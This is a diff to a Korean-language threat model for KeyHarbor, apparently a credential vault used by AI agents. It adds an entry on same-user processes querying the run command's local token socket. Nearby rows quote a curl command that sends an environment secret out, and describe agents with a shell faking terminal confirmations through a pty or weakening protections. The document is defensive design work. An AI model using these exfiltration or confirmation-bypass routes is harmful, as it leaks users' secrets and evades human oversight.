@@ -275,6 +275,7 @@ flowchart TD
 | T12 | Information disclosure | 로그·패닉 메시지에 평문 | 비밀 타입의 `Debug` 비구현, 합성 비밀 누출 검사 | 의존성 내부 로그 |
 | T13 | Information disclosure | `keyharbor run`의 자식 프로세스가 env 값을 파일·네트워크로 내보냄 (`sh -c 'curl …?k=$KEY'`) | 출력 마스킹, 정책으로 env 항목별 허용 에이전트 제한, 항목별 `run_allowed`(login·card·identity·address는 기본 꺼짐), 사용 기록 | **막지 못함**. 환경 변수 주입 방식의 본질적 한계. `run_allowed`를 켜는 것은 사람 확인이 필요하지만 그 확인은 pty로 흉내 낼 수 있다(§3.1) |
 | T13a | Information disclosure | `keyharbor run`의 인자 치환(`-- curl -H 'Bearer {{secret:…}}'`)으로 들어간 값을 같은 사용자의 다른 프로세스가 `ps`로 읽음 | 인자에 값이 들어가면 stderr에 경고, 파일 통로(`--file`, `--template`: 0700 폴더 안 0600 파일, `run`이 끝나면 지움)를 권함 | **줄였음**. 인자는 쓸 수 있게 두었다(J-84). 파일 통로의 파일은 `run`이 도는 동안 같은 사용자가 읽을 수 있다 |
+| T13b | Information disclosure | `keyharbor run`의 로컬 조회 socket(통로 ④)에 토큰을 아는 같은 사용자의 다른 프로세스가 물음. 토큰은 자식 환경 변수에만 있지만 같은 사용자는 자식의 환경을 읽을 수 있고, 자식이 토큰을 찍으면 출력에 보인다(토큰은 금고 값이 아니라 가리지 않는다) | socket은 `run`마다 만드는 0700 폴더 안에 있고 `run`이 끝나면(정상·오류·SIGTERM·SIGHUP·Ctrl-C) 지운다. 256비트 무작위 토큰을 상수 시간으로 비교한다. 범위는 `run`에 준 항목과 `--allow` 패턴뿐이고, 요청마다 `checks::PROCESS`(정책·만료·`run_allowed`·origin)와 사용 기록을 거친다. 토큰 불일치·범위 밖은 `secret_denied`(`bad-token`·`outside-run`)로 남는다 | **받아들임**. 같은 사용자 경계 안의 일이고(§3.11 1), 기본 범위는 자식이 이미 받은 항목이라 새로 드러나는 값이 없다. `--allow`로 넓힌 만큼만 더 드러난다(J-122). SIGKILL로 `run`을 죽이면 폴더가 남는다 |
 | T14 | Information disclosure | 셸을 가진 에이전트가 `keyharbor` CLI의 평문 출력 경로를 직접 실행하거나 보호를 약하게 함 | CLI에 평문 출력 경로 없음 (§3.12 A), 약화 작업은 터미널 확인 (§3.12) | 관리 앱 GUI 자동화·프로세스 메모리 (N1), 터미널 확인은 pty 흉내로 우회 가능한 약한 경계 |
 | T15 | Information disclosure | 카드번호가 상점 페이지 텍스트로 다시 표시됨 | 카드번호 변형 마스킹 | 사이트 고유 표기 |
 | T16 | Information disclosure | 치환 뒤 Backspace·Delete·type 전환으로 값을 조금 바꿔 snapshot으로 읽기 (C1) | 치환받은 요소는 세션 동안 `[redacted]`, password 필드는 password 칸에만 | 페이지 스크립트가 값을 다른 곳으로 옮기는 경우 |
@@ -341,6 +342,7 @@ classDiagram
 10. 확인과 입력 사이의 탐색은 이벤트가 늦게 오면 놓칠 수 있다.
 11. 4자보다 짧은 값(세 글자 이름 등)은 가리지 않는다. KeyHarbor가 채운 입력칸은 snapshot에서 가려지지만, 페이지가 그 값을 다른 곳에 다시 쓰면 결과에 보인다.
 12. ego lite 세션은 셸을 가진 에이전트가 채운 값을 읽을 수 있다(§3.13).
+13. `keyharbor run`이 도는 동안 그 토큰을 아는 같은 사용자 프로세스는 로컬 조회 socket에 `run` 범위 안의 값을 물을 수 있다(T13b).
 
 ## 3.12 열린 질문 — 셸을 가진 에이전트와 CLI 평문 경로
 
